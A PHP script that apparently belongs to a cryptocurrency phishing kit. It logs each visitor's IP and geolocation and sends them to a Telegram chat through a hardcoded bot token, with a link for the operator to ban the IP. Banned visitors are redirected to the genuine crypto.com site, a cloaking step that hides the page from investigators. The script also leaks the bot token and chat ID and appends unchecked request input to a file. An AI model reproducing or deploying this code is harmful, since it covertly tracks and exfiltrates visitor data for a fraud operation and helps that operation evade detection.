<?php

// Get the visitor's IP address
$ip = $_SERVER['REMOTE_ADDR'];

// Function to check if an IP address is banned
function isBanned($ip) {
  $bannedList = file_get_contents('banned.txt');
  return strpos($bannedList, $ip) !== false;
}

// Check if the visitor's IP address is already banned
if (isBanned($ip)) {
  header("Location: https://crypto.com/");
  exit;
}

// Send request to the ip-api.com API to get visitor's information
$apiUrl = "http://ip-api.com/json/{$ip}?fields=city,country,zip";
$response = file_get_contents($apiUrl);
$data = json_decode($response);

// Extract relevant information from the API response
$city = $data->city;
$country = $data->country;
$zipCode = $data->zip;

// Bot token and chat ID for sending messages to Telegram channel
$botToken = "6375326209:AAHznFTmYEJkWiY0qaoSWlEHwdyG5ixKufQ";
$chatId = "-1002117422654";

// Prepare the message to be sent to Telegram
$banLink = "https://cx34599.tw1.ru/cry/app/verification/ban.php?ip={$ip}";
$message = "New visitor:
IP: {$ip}
City: {$city}
Country: {$country}
Zip: {$zipCode}
Ban IP: [Click here to ban]({$banLink})";

// Prepare the API URL to send the message to Telegram
$telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
$messageData = array(
  'chat_id' => $chatId,
  'text' => $message,
  'parse_mode' => 'Markdown'
);
$options = array(
  'http' => array(
    'method' => 'POST',
    'header' => 'Content-type: application/x-www-form-urlencoded',
    'content' => http_build_query($messageData),
  ),
);
$context = stream_context_create($options);
$result = file_get_contents($telegramApiUrl, false, $context);

// Handle ban IP command from Telegram
if (isset($_GET['command']) && $_GET['command'] === 'banip') {
  // Extract the IP address from the command
  $commandParams = explode('_', $_GET['commandParam']);
  $ipToBan = $commandParams[1];

  // Ban the IP address
  file_put_contents('banned.txt', "{$ipToBan}\n", FILE_APPEND);

  // Redirect the visitor
  header("Location: https://crypto.com/");
  exit;
}
?>




